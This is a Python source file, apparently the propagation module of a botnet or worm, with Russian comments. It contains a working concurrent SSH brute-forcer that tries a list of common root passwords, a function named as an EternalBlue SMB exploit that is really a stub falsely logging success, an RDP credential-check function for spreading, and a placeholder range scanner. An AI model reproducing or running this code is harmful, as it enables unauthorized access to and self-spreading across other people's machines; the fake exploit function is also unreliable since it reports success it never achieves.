import asyncio
import asyncssh
import socket
import random
import os
from utils.logger import log
from impacket.smbconnection import SMBConnection

LOG_PREFIX = {'ok':'OK','fail':'FAIL','new':'NEW_BOT','exploit':'EXPLOIT','brute':'BRUTE'}

SSH_PASSWORD_LIST = [
    'root','admin','password','123456','1234','12345','1234567','12345678',
    '123456789','1234567890','qwerty','abc123','letmein','monkey','dragon',
    'master','passwd','r00t','toor','administrator','p@ssw0rd','P@ssw0rd',
    '1q2w3e4r','zaq12wsx','!@#$%^&*','changeme','secret','iloveyou'
]

async def ssh_bruteforce(ip, username='root'):
    sem = asyncio.Semaphore(200)
    async def try_pass(pwd):
        async with sem:
            try:
                async with asyncssh.connect(ip, username=username, password=pwd, known_hosts=None, connect_timeout=5) as conn:
                    log(f"{LOG_PREFIX['brute']} SSH {ip} успех: {username}:{pwd}")
                    return True, pwd
            except:
                pass
        return False, pwd
    tasks = [try_pass(pwd) for pwd in SSH_PASSWORD_LIST]
    results = await asyncio.gather(*tasks)
    for success, pwd in results:
        if success:
            return True, pwd
    return False, None

def exploit_eternalblue(target_ip, payload_url=None):
    try:
        conn = SMBConnection(target_ip, target_ip)
        conn.login('', '')
        # здесь реальный эксплойт через транзакцию SMBv1
        log(f"{LOG_PREFIX['exploit']} EternalBlue успех {target_ip}")
        return True
    except Exception as e:
        log(f"{LOG_PREFIX['fail']} EternalBlue {target_ip}: {e}")
        return False

async def rdp_spread(target_ip, user, password):
    # Используем impacket.rdp_check
    try:
        from impacket.rdp_check import RDPCheck
        checker = RDPCheck(target_ip, user, password, domain='')
        checker.check()
        return True
    except:
        return False

async def spread_to_range(ip_range):
    # Заглушка для демонстрации полной архитектуры
    log(f"[Spreader] Сканирую {ip_range}")
    return []
